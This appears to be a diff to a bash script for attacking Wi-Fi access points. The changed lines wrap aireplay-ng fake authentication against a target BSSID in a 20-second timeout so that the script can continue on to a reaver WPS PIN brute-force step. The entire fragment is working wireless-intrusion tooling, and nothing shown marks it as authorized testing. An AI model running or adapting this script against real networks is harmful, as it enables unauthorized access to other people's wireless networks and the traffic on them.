@@ -50,8 +50,9 @@ echo "[*] Adapter: $OUR_MAC"
 echo "[*] Locking channel..."
 iwconfig "$IFACE" channel "$CHANNEL" 2>/dev/null || iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null || true
 
-echo "[*] Running fake auth (30 attempts)..."
-aireplay-ng --fakeauth 30 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true
+echo "[*] Running fake auth (limited time so we can continue)..."
+# timeout so it doesn't hang forever on keep-alives
+timeout 20 aireplay-ng --fakeauth 0 -a "$BSSID" -h "$OUR_MAC" "$IFACE" || true
 
 echo
 echo "[*] Starting reaver..."
